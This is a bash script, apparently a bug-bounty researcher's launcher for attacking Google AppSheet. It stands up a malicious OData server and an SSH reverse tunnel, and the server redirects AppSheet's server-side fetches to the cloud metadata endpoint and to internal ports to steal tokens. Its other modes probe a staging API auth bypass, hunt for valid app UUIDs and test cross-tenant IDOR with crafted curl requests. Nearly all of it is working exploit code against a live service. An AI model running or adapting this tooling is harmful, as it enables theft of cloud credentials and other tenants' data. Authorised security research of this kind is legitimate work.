#!/usr/bin/env bash
# appsheet-ssrf-probe.sh — AppSheet OData SSRF full-session launcher
#
# Confirmed attack surface (2026-06-15):
#   - OData connector makes server-side HTTP requests from GCP IP 35.203.182.241
#   - Authorization: Basic credentials forwarded to attacker URL
#   - Traceparent internal header leaked
#   - 169.254.169.254 TCP-reachable (SSL error = TLS handshake attempt, not refused)
#   - Cross-scheme HTTPS→HTTP redirect blocked by .NET HttpClient (both OData v2 and v4)
#
# Session goals:
#   1. Prove AppSheet data-fetch code path (after metadata succeeds) follows redirects
#   2. Probe internal ports via redirect: localhost:8080, 127.0.0.1:3000, etc.
#   3. Find valid staging UUID to escalate F001 from Medium → Critical
#   4. Test IDOR cross-tenant with second Google account
#
# Usage:
#   ./scripts/appsheet-ssrf-probe.sh --setup              # Start server + tunnel
#   ./scripts/appsheet-ssrf-probe.sh --setup --target imds_all
#   ./scripts/appsheet-ssrf-probe.sh --setup --target localhost_8080
#   ./scripts/appsheet-ssrf-probe.sh --staging            # Staging auth bypass verification
#   ./scripts/appsheet-ssrf-probe.sh --idor --app-id <UUID> --token-b <KEY>
#   PORT=8443 ./scripts/appsheet-ssrf-probe.sh --setup

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
RESULTS_DIR="$REPO_ROOT/results/appsheet.com"
PORT="${PORT:-7332}"
STAGING_API="https://api.gcp-staging.appsheet.com"
PROD_API="https://api.appsheet.com"

# Colours
GRN='\033[0;32m'; YLW='\033[1;33m'; RED='\033[0;31m'; CYN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${GRN}[+]${NC} $*"; }
warn() { echo -e "${YLW}[!]${NC} $*"; }
err()  { echo -e "${RED}[✗]${NC} $*" >&2; }
info() { echo -e "${CYN}[*]${NC} $*"; }

mkdir -p "$RESULTS_DIR/03-candidates/evidence"

# ─── Scope gate (mandatory) ───────────────────────────────────────────────────
scope_out="$("$SCRIPT_DIR/scope-check.sh" "appsheet.com" 2>/dev/null || echo OUT-OF-SCOPE)"
[[ "$scope_out" == IN-SCOPE* ]] || { err "OUT OF SCOPE — aborting"; exit 2; }
log "Scope: $scope_out"

# ─── Mode: --setup (full SSRF server + tunnel) ───────────────────────────────
mode_setup() {
  local target="${1:-imds_token}"
  local custom_target="${2:-}"
  local logfile="$RESULTS_DIR/ssrf-hits-$(date +%Y%m%d-%H%M%S).jsonl"
  local tunnel_log
  tunnel_log="$(mktemp /tmp/lhr-XXXX.log)"

  # Cleanup
  SERVER_PID=""; TUNNEL_PID=""
  cleanup() {
    echo ""
    info "Shutting down..."
    [ -n "$SERVER_PID" ] && kill "$SERVER_PID" 2>/dev/null || true
    [ -n "$TUNNEL_PID" ] && kill "$TUNNEL_PID" 2>/dev/null || true
    fuser -k "${PORT}/tcp" 2>/dev/null || true
    log "Hit log: $logfile"
  }
  trap cleanup EXIT INT TERM

  info "Killing stale servers on :$PORT..."
  pkill -f "odata-ssrf-server" 2>/dev/null || true
  fuser -k "${PORT}/tcp" 2>/dev/null || true
  sleep 1

  # Build server command
  local srv_args=("--port" "$PORT" "--log" "$logfile")
  if [ -n "$custom_target" ]; then
    srv_args+=("--custom-target" "$custom_target")
  else
    srv_args+=("--target" "$target")
  fi

  info "Starting odata-ssrf-server.py (target: ${custom_target:-$target})..."
  python3 "$SCRIPT_DIR/odata-ssrf-server.py" "${srv_args[@]}" &
  SERVER_PID=$!
  sleep 1

  kill -0 "$SERVER_PID" 2>/dev/null || { err "Server failed to start"; exit 1; }

  # Self-test
  local http_code
  http_code=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${PORT}/\$metadata" 2>/dev/null || echo "000")
  [ "$http_code" = "200" ] || { err "Server self-test failed (got $http_code)"; exit 1; }
  log "Server alive — /\$metadata → 200"

  # Tunnel
  info "Opening localhost.run SSH tunnel (port $PORT)..."
  ssh -R "80:localhost:${PORT}" \
      -o StrictHostKeyChecking=no \
      -o ServerAliveInterval=20 \
      -o ExitOnForwardFailure=yes \
      nokey@localhost.run >"$tunnel_log" 2>&1 &
  TUNNEL_PID=$!

  local tunnel_url=""
  for _ in $(seq 1 20); do
    tunnel_url=$(grep -oP 'https://[a-z0-9]+\.lhr\.life' "$tunnel_log" 2>/dev/null | tail -1 || true)
    [ -n "$tunnel_url" ] && break
    sleep 1
  done
  [ -n "$tunnel_url" ] || { err "Tunnel failed"; cat "$tunnel_log"; exit 1; }

  # End-to-end verify
  local tcode
  tcode=$(curl -s -o /dev/null -w "%{http_code}" "${tunnel_url}/\$metadata" 2>/dev/null || echo "000")
  if [ "$tcode" = "200" ]; then
    log "Tunnel live — end-to-end /\$metadata → 200"
  else
    warn "Tunnel check got HTTP $tcode (expected 200). AppSheet may get 503."
  fi

  # Instructions
  echo ""
  echo "╔══════════════════════════════════════════════════════════════════════╗"
  echo "║  AppSheet OData SSRF — Ready                                        ║"
  echo "╠══════════════════════════════════════════════════════════════════════╣"
  printf "║  URL (paste in AppSheet): %-44s║\n" "$tunnel_url"
  echo "║  OData Version : 4.0                                                ║"
  echo "║  Username      : testuser                                            ║"
  echo "║  Password      : testpass1234                                        ║"
  echo "║  SAP Gateway   : Is not SAP Gateway                                 ║"
  echo "║  CSRF          : CSRF not required                                   ║"
  echo "╠══════════════════════════════════════════════════════════════════════╣"
  echo "║  Navigate to: appsheet.com/Account/ODataAuthInfo                    ║"
  echo "╠══════════════════════════════════════════════════════════════════════╣"
  echo "║  FLOW:                                                               ║"
  echo "║  Step 1 — Test: AppSheet hits /\$metadata → server returns OData XML ║"
  echo "║           AppSheet shows SUCCESS (not error) → save the connection  ║"
  echo "║  Step 2 — Add the saved source to an app → open the app             ║"
  echo "║           AppSheet fetches /Rows → server returns 302 → target      ║"
  echo "║  Step 3 — Watch *** GCP BACKEND HIT *** lines (IP 35.x or 34.x)    ║"
  echo "╠══════════════════════════════════════════════════════════════════════╣"
  printf "║  Redirect target : %-51s║\n" "${custom_target:-$target}"
  echo "║  Hit log         : $logfile"
  echo "╚══════════════════════════════════════════════════════════════════════╝"
  echo ""
  info "Waiting for requests... (Ctrl+C to stop)"
  wait "$SERVER_PID"
}

# ─── Mode: --staging (verify F001 auth bypass + probe for valid UUID) ─────────
mode_staging() {
  local test_uuid="${1:-00000000-0000-0000-0000-000000000001}"
  info "=== F001 Staging API Auth Bypass Verification ==="

  # Production: auth IS enforced
  log "Production (expect: ApplicationAccessKey is missing)..."
  PROD=$(curl -si --max-time 10 \
    "$PROD_API/api/v2/apps/$test_uuid/tables" \
    -H "Content-Type: application/json" 2>/dev/null | tail -1)
  echo "  → $PROD"

  # Staging: auth IS NOT enforced
  log "Staging (expect: App not found — proves auth skipped)..."
  STG=$(curl -si --max-time 10 \
    "$STAGING_API/api/v2/apps/$test_uuid/tables" \
    -H "Content-Type: application/json" 2>/dev/null | tail -1)
  echo "  → $STG"

  # Method confusion test
  log "Staging GET /data (expect: 405 Method Not Allowed — proves routing reached handler)..."
  M405=$(curl -si --max-time 10 \
    "$STAGING_API/api/v2/apps/$test_uuid/tables/Table1/data" \
    -H "Content-Type: application/json" 2>/dev/null | grep -E "^HTTP|Allow:")
  echo "  → $M405"

  if echo "$STG" | grep -q "not found"; then
    log "F001 CONFIRMED: Auth bypass active on staging API"
    echo ""
    warn "To escalate F001 from Medium (6.5) → Critical (9.1):"
    echo "  Need: a valid staging App UUID"
    echo "  Try:  ./scripts/staging-uuid-hunt.sh"
    echo "  Or:   search GitHub for 'api.gcp-staging.appsheet.com'"
  else
    warn "Unexpected staging response — check if endpoint has changed"
  fi
}

# ─── Mode: --idor ─────────────────────────────────────────────────────────────
mode_idor() {
  local app_id="${1:-}"
  local token_b="${2:-}"

  info "=== Cross-Tenant IDOR Test ==="
  echo ""
  echo "  Requires 2 AppSheet accounts:"
  echo "    Account A: Owner of the app (app-id from URL)"
  echo "    Account B: Different Gmail → different tenant"
  echo ""

  if [ -z "$app_id" ] || [ -z "$token_b" ]; then
    warn "Provide --app-id and --token-b to run automated test"
    echo ""
    echo "  Manual test with Account B's API key:"
    echo ""
    echo "  # Step 1: Get Account B's API key"
    echo "  #   AppSheet → Account → Integrations → copy API Key"
    echo ""
    echo "  # Step 2: Try to read Account A's private app data:"
    echo "  curl -sX POST '$PROD_API/api/v2/apps/<ACCOUNT_A_APP_ID>/tables/<TABLE>/Action' \\"
    echo "    -H 'ApplicationAccessKey: <ACCOUNT_B_API_KEY>' \\"
    echo "    -H 'Content-Type: application/json' \\"
    echo "    -d '{\"Action\":\"Find\",\"Properties\":{},\"Rows\":[]}'"
    echo ""
    echo "  Expected (secure): 403 Forbidden"
    echo "  Vulnerable:        200 OK with Account A's data → HIGH IDOR"
    return 0
  fi

  log "Testing IDOR: Account B key accessing app $app_id..."
  RESP=$(curl -sfX POST \
    "$PROD_API/api/v2/apps/$app_id/tables/Sheet1/Action" \
    -H "ApplicationAccessKey: $token_b" \
    -H "Content-Type: application/json" \
    -d '{"Action":"Find","Properties":{},"Rows":[]}' \
    -w "\nHTTP_CODE:%{http_code}" 2>/dev/null)

  HTTP_CODE=$(echo "$RESP" | grep "HTTP_CODE:" | cut -d: -f2)
  BODY=$(echo "$RESP" | grep -v "HTTP_CODE:")

  log "HTTP $HTTP_CODE"
  echo "$BODY" | head -5

  if [ "$HTTP_CODE" = "200" ]; then
    warn "POTENTIAL IDOR: Account B can read Account A's app data!"
    echo "$RESP" >> "$RESULTS_DIR/03-candidates/evidence/idor-proof.txt"
  else
    log "Access denied (HTTP $HTTP_CODE) — cross-tenant protection working"
  fi
}

# ─── Mode: --staging-probe (test specific endpoints on staging) ───────────────
mode_staging_probe() {
  local uuid="$1"
  info "Probing staging with UUID: $uuid"

  for endpoint in \
    "/api/v2/apps/$uuid/tables" \
    "/api/v2/apps/$uuid/tables/Sheet1/Action" \
    "/api/v2/apps/$uuid/tables/Sheet1/data"; do

    METHOD="GET"
    DATA=""
    [[ "$endpoint" == */Action ]] && METHOD="POST" && DATA='-d {"Action":"Find","Properties":{},"Rows":[]}'
    [[ "$endpoint" == */data ]]   && METHOD="POST" && DATA='-d {"Action":"Find","Properties":{},"Rows":[]}'

    RESP=$(curl -si --max-time 10 -X "$METHOD" \
      "$STAGING_API$endpoint" \
      -H "Content-Type: application/json" \
      ${DATA:+-d "$DATA"} 2>/dev/null)

    HTTP=$(echo "$RESP" | head -1)
    BODY=$(echo "$RESP" | tail -1)

    if echo "$BODY" | grep -qv '"App not found"\|"not found"'; then
      warn "INTERESTING RESPONSE on $endpoint:"
      echo "$RESP"
    else
      log "$METHOD $endpoint → $HTTP"
    fi
  done
}

# ─── Main ─────────────────────────────────────────────────────────────────────
MODE="${1:---help}"
shift || true

case "$MODE" in
  --setup)
    TARGET_ARG="imds_token"
    CUSTOM_ARG=""
    while [[ $# -gt 0 ]]; do
      case $1 in
        --target)        TARGET_ARG="$2"; shift 2 ;;
        --custom-target) CUSTOM_ARG="$2"; shift 2 ;;
        --port)          PORT="$2";       shift 2 ;;
        *) shift ;;
      esac
    done
    mode_setup "$TARGET_ARG" "$CUSTOM_ARG"
    ;;

  --staging)
    UUID="${1:-00000000-0000-0000-0000-000000000001}"
    mode_staging "$UUID"
    ;;

  --staging-probe)
    [ -n "${1:-}" ] || { err "Usage: --staging-probe <UUID>"; exit 1; }
    mode_staging_probe "$1"
    ;;

  --idor)
    APP_ID=""
    TOKEN_B=""
    while [[ $# -gt 0 ]]; do
      case $1 in
        --app-id)  APP_ID="$2";  shift 2 ;;
        --token-b) TOKEN_B="$2"; shift 2 ;;
        *) shift ;;
      esac
    done
    mode_idor "$APP_ID" "$TOKEN_B"
    ;;

  --help|-h)
    grep '^#' "$0" | head -25 | sed 's/^# \?//'
    ;;

  *)
    err "Unknown mode: $MODE"
    echo "Run with --help for usage"
    exit 1
    ;;
esac
